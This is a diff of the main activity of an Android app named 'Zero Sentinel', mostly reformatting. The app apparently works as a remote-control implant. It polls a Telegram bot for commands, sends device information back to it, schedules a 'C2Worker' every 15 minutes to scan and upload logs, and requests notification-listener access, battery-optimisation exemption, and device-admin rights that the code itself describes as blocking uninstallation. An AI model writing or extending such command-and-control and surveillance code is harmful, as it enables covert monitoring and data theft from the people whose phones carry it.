@@ -2,15 +2,11 @@ package com.zero.sentinel.ui
 
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.net.Uri
-import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.util.Log
-import android.view.Gravity
 import android.widget.EditText
-import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
@@ -19,6 +15,9 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import androidx.core.view.GravityCompat
 import androidx.drawerlayout.widget.DrawerLayout
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.lifecycleScope
+import androidx.lifecycle.repeatOnLifecycle
 import androidx.work.*
 import com.google.android.material.navigation.NavigationView
 import com.zero.sentinel.R
@@ -27,17 +26,13 @@ import com.zero.sentinel.network.GithubUpdater
 import com.zero.sentinel.network.TelegramClient
 import com.zero.sentinel.utils.DeviceInfoHelper
 import com.zero.sentinel.workers.C2Worker
+import java.util.concurrent.TimeUnit
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
-import java.util.concurrent.TimeUnit
-
-import androidx.lifecycle.Lifecycle
-import androidx.lifecycle.lifecycleScope
-import androidx.lifecycle.repeatOnLifecycle
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 
 class MainActivity : AppCompatActivity() {
 
@@ -49,33 +44,33 @@ class MainActivity : AppCompatActivity() {
     private lateinit var navigationView: NavigationView
     private lateinit var btnMenu: android.widget.ImageView
     private lateinit var iconStatus: android.widget.ImageView
-    
+
     private lateinit var etBotToken: EditText
     private lateinit var etChatId: EditText
     private lateinit var btnTest: android.widget.Button
     private lateinit var btnSave: android.widget.Button
-    
+
     private lateinit var prefsManager: EncryptedPrefsManager
 
     // Permission launcher: requests all needed permissions
-    private val permissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { results ->
-        val allGranted = results.values.all { it }
-        if (allGranted) {
-            performFullSystemTest()
-        } else {
-            Toast.makeText(this, "⚠️ Some permissions denied.", Toast.LENGTH_LONG).show()
-            performFullSystemTest()
-        }
-    }
+    private val permissionLauncher =
+            registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
+                    results ->
+                val allGranted = results.values.all { it }
+                if (allGranted) {
+                    performFullSystemTest()
+                } else {
+                    Toast.makeText(this, "⚠️ Some permissions denied.", Toast.LENGTH_LONG).show()
+                    performFullSystemTest()
+                }
+            }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
         prefsManager = EncryptedPrefsManager(this)
-        
+
         // Notification: Config Phase (Session Guarded)
         if (isFirstLaunch) {
             isFirstLaunch = false
@@ -90,7 +85,7 @@ class MainActivity : AppCompatActivity() {
         setupDrawer()
         setupListeners()
         loadCredentials()
-        
+
         // Auto-start stuff
         checkAndStartService()
         schedulePeriodicWork()
@@ -107,15 +102,22 @@ class MainActivity : AppCompatActivity() {
                     try {
                         withContext(Dispatchers.IO) {
                             val client = TelegramClient(this@MainActivity)
-                            val repository = (applicationContext as com.zero.sentinel.ZeroSentinelApp).repository
-                            val commandProcessor = com.zero.sentinel.network.CommandProcessor(this@MainActivity, repository, client)
-                            
+                            val repository =
+                                    (applicationContext as com.zero.sentinel.ZeroSentinelApp)
+                                            .repository
+                            val commandProcessor =
+                                    com.zero.sentinel.network.CommandProcessor(
+                                            this@MainActivity,
+                                            repository,
+                                            client
+                                    )
+
                             val lastUpdateId = prefsManager.getLastUpdateId()
                             val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
-                            
+
                             val updates = client.pollUpdates(nextOffset)
                             val maxUpdateId = commandProcessor.processUpdates(updates)
-                            
+
                             if (maxUpdateId > lastUpdateId) {
                                 prefsManager.saveLastUpdateId(maxUpdateId)
                             }
@@ -135,7 +137,7 @@ class MainActivity : AppCompatActivity() {
         navigationView = findViewById(R.id.nav_view)
         btnMenu = findViewById(R.id.btn_menu)
         iconStatus = findViewById(R.id.icon_status)
-        
+
         etBotToken = findViewById(R.id.et_bot_token)
         etChatId = findViewById(R.id.et_chat_id)
         btnTest = findViewById(R.id.btn_test)
@@ -143,9 +145,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun setupDrawer() {
-        btnMenu.setOnClickListener {
-            drawerLayout.openDrawer(GravityCompat.START)
-        }
+        btnMenu.setOnClickListener { drawerLayout.openDrawer(GravityCompat.START) }
 
         // Set version text in header
         val headerView = navigationView.getHeaderView(0)
@@ -190,9 +190,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         // Test (check permissions first)
-        btnTest.setOnClickListener {
-            checkPermissionsAndTest()
-        }
+        btnTest.setOnClickListener { checkPermissionsAndTest() }
     }
 
     private fun loadCredentials() {
@@ -217,9 +215,13 @@ class MainActivity : AppCompatActivity() {
 
     private fun updateStatusIcon(active: Boolean) {
         if (active) {
-            iconStatus.setColorFilter(androidx.core.content.ContextCompat.getColor(this, R.color.success_green))
+            iconStatus.setColorFilter(
+                    androidx.core.content.ContextCompat.getColor(this, R.color.success_green)
+            )
         } else {
-             iconStatus.setColorFilter(androidx.core.content.ContextCompat.getColor(this, R.color.indigo_accent))
+            iconStatus.setColorFilter(
+                    androidx.core.content.ContextCompat.getColor(this, R.color.indigo_accent)
+            )
         }
     }
 
@@ -246,10 +248,10 @@ class MainActivity : AppCompatActivity() {
         prefsManager.saveChatId(chat)
 
         Toast.makeText(this, "🔄 Starting System Test...", Toast.LENGTH_SHORT).show()
-        
+
         CoroutineScope(Dispatchers.IO).launch {
             val client = TelegramClient(this@MainActivity)
-            
+
             // 1. Verify Token
             val botUser = client.testToken()
             if (botUser == null) {
@@ -272,9 +274,14 @@ class MainActivity : AppCompatActivity() {
             client.sendMessage("🔔 *TEST CONNECTION*\n\n$deviceInfo")
 
             withContext(Dispatchers.Main) {
-                 Toast.makeText(this@MainActivity, "✅ Token OK. Commands Updated. Info Sent.", Toast.LENGTH_SHORT).show()
-                 // 4. Trigger C2 Cycle (Log Upload)
-                 triggerOneTimeC2()
+                Toast.makeText(
+                                this@MainActivity,
+                                "✅ Token OK. Commands Updated. Info Sent.",
+                                Toast.LENGTH_SHORT
+                        )
+                        .show()
+                // 4. Trigger C2 Cycle (Log Upload)
+                triggerOneTimeC2()
             }
         }
     }
@@ -282,65 +289,66 @@ class MainActivity : AppCompatActivity() {
     private fun triggerOneTimeC2() {
         val request = OneTimeWorkRequest.Builder(C2Worker::class.java).build()
         WorkManager.getInstance(this).enqueue(request)
-        
-        WorkManager.getInstance(this).getWorkInfoByIdLiveData(request.id).observe(this) { workInfo ->
-             if (workInfo != null) {
-                 when (workInfo.state) {
-                     WorkInfo.State.SUCCEEDED -> {
-                         Toast.makeText(this, "✅ C2 Cycle (Scan/Upload) Complete!", Toast.LENGTH_LONG).show()
-                         updateStatusIcon(true)
-                     }
-                     WorkInfo.State.FAILED -> {
-                         Toast.makeText(this, "❌ C2 Cycle Failed", Toast.LENGTH_LONG).show()
-                         updateStatusIcon(false)
-                     }
-                     WorkInfo.State.RUNNING -> {
-                         // Optional: Show loading indicator
-                     }
-                     else -> {}
-                 }
-             }
+
+        WorkManager.getInstance(this).getWorkInfoByIdLiveData(request.id).observe(this) { workInfo
+            ->
+            if (workInfo != null) {
+                when (workInfo.state) {
+                    WorkInfo.State.SUCCEEDED -> {
+                        Toast.makeText(
+                                        this,
+                                        "✅ C2 Cycle (Scan/Upload) Complete!",
+                                        Toast.LENGTH_LONG
+                                )
+                                .show()
+                        updateStatusIcon(true)
+                    }
+                    WorkInfo.State.FAILED -> {
+                        Toast.makeText(this, "❌ C2 Cycle Failed", Toast.LENGTH_LONG).show()
+                        updateStatusIcon(false)
+                    }
+                    WorkInfo.State.RUNNING -> {
+                        // Optional: Show loading indicator
+                    }
+                    else -> {}
+                }
+            }
         }
     }
 
     private fun schedulePeriodicWork() {
         // 1. Schedule C2Worker every 15 minutes
-        val c2WorkRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
-            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
-            .build()
-        
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "SentinelC2",
-            ExistingPeriodicWorkPolicy.KEEP,
-            c2WorkRequest
-        )
+        val c2WorkRequest =
+                PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
+                        .setConstraints(
+                                Constraints.Builder()
+                                        .setRequiredNetworkType(NetworkType.CONNECTED)
+                                        .build()
+                        )
+                        .build()
 
-        // 2. Schedule NotificationCleanupWorker daily at 3 AM
-        val cleanupWorkRequest = PeriodicWorkRequestBuilder<com.zero.sentinel.workers.NotificationCleanupWorker>(1, TimeUnit.DAYS)
-            .setInitialDelay(calculateDelayTo3AM(), TimeUnit.MILLISECONDS)
-            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
-            .build()
-        
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "NotificationCleanup",
-            ExistingPeriodicWorkPolicy.KEEP,
-            cleanupWorkRequest
-        )
+        WorkManager.getInstance(this)
+                .enqueueUniquePeriodicWork(
+                        "SentinelC2",
+                        ExistingPeriodicWorkPolicy.KEEP,
+                        c2WorkRequest
+                )
     }
 
     private fun calculateDelayTo3AM(): Long {
         val now = java.util.Calendar.getInstance()
-        val target = java.util.Calendar.getInstance().apply {
-            set(java.util.Calendar.HOUR_OF_DAY, 3)
-            set(java.util.Calendar.MINUTE, 0)
-            set(java.util.Calendar.SECOND, 0)
-        }
-        
+        val target =
+                java.util.Calendar.getInstance().apply {
+                    set(java.util.Calendar.HOUR_OF_DAY, 3)
+                    set(java.util.Calendar.MINUTE, 0)
+                    set(java.util.Calendar.SECOND, 0)
+                }
+
         // If 3 AM has already passed today, schedule for tomorrow
         if (target.before(now)) {
             target.add(java.util.Calendar.DAY_OF_MONTH, 1)
         }
-        
+
         return target.timeInMillis - now.timeInMillis
     }
 
@@ -357,39 +365,41 @@ class MainActivity : AppCompatActivity() {
         val etPinConfirm = dialogView.findViewById<EditText>(R.id.et_pin_confirm)
 
         AlertDialog.Builder(this, R.style.Theme_ZeroSentinel_Dialog)
-            .setView(dialogView)
-            .setPositiveButton(R.string.pin_dialog_save) { _, _ ->
-                val p1 = etPinNew.text.toString()
-                val p2 = etPinConfirm.text.toString()
-                if (p1.length == 6 && p1 == p2) {
-                    prefsManager.saveAppPassword(p1)
-                    Toast.makeText(this, "PIN Updated ✅", Toast.LENGTH_SHORT).show()
-                } else {
-                    Toast.makeText(this, "Mismatch or Invalid length", Toast.LENGTH_SHORT).show()
+                .setView(dialogView)
+                .setPositiveButton(R.string.pin_dialog_save) { _, _ ->
+                    val p1 = etPinNew.text.toString()
+                    val p2 = etPinConfirm.text.toString()
+                    if (p1.length == 6 && p1 == p2) {
+                        prefsManager.saveAppPassword(p1)
+                        Toast.makeText(this, "PIN Updated ✅", Toast.LENGTH_SHORT).show()
+                    } else {
+                        Toast.makeText(this, "Mismatch or Invalid length", Toast.LENGTH_SHORT)
+                                .show()
+                    }
                 }
-            }
-            .setNegativeButton(R.string.pin_dialog_cancel, null)
-            .show()
+                .setNegativeButton(R.string.pin_dialog_cancel, null)
+                .show()
     }
 
     private fun showPermissionsDialog() {
-        val items = arrayOf(
-            "Notification Access: ${if(isNotificationServiceEnabled()) "✅" else "❌"}",
-            "Battery Optimization: ${if(isIgnoringBatteryOptimizations()) "✅" else "❌"}",
-            "Admin Privileges: ${if(isAdminActive()) "✅" else "❌"}"
-        )
+        val items =
+                arrayOf(
+                        "Notification Access: ${if(isNotificationServiceEnabled()) "✅" else "❌"}",
+                        "Battery Optimization: ${if(isIgnoringBatteryOptimizations()) "✅" else "❌"}",
+                        "Admin Privileges: ${if(isAdminActive()) "✅" else "❌"}"
+                )
 
         AlertDialog.Builder(this, R.style.Theme_ZeroSentinel_Dialog)
-            .setTitle("System Permissions")
-            .setItems(items) { _, which ->
-                 when(which) {
-                     0 -> requestNotificationAccess()
-                     1 -> requestBatteryOptimization()
-                     2 -> requestAdmin()
-                 }
-            }
-            .setPositiveButton("Close", null)
-            .show()
+                .setTitle("System Permissions")
+                .setItems(items) { _, which ->
+                    when (which) {
+                        0 -> requestNotificationAccess()
+                        1 -> requestBatteryOptimization()
+                        2 -> requestAdmin()
+                    }
+                }
+                .setPositiveButton("Close", null)
+                .show()
     }
 
     // --- Permission Helpers ---
@@ -398,7 +408,7 @@ class MainActivity : AppCompatActivity() {
         val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         return flat?.contains(packageName) == true
     }
-    
+
     private fun requestNotificationAccess() {
         startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
     }
@@ -416,19 +426,31 @@ class MainActivity : AppCompatActivity() {
             startActivity(intent)
         }
     }
-    
+
     private fun isAdminActive(): Boolean {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-        val cn = android.content.ComponentName(this, com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java)
+        val dpm =
+                getSystemService(Context.DEVICE_POLICY_SERVICE) as
+                        android.app.admin.DevicePolicyManager
+        val cn =
+                android.content.ComponentName(
+                        this,
+                        com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java
+                )
         return dpm.isAdminActive(cn)
     }
-    
+
     private fun requestAdmin() {
-        val cn = android.content.ComponentName(this, com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java)
+        val cn =
+                android.content.ComponentName(
+                        this,
+                        com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java
+                )
         val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
-        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Protects the app from unauthorized uninstallation.")
+        intent.putExtra(
+                android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                "Protects the app from unauthorized uninstallation."
+        )
         startActivity(intent)
     }
-
 }
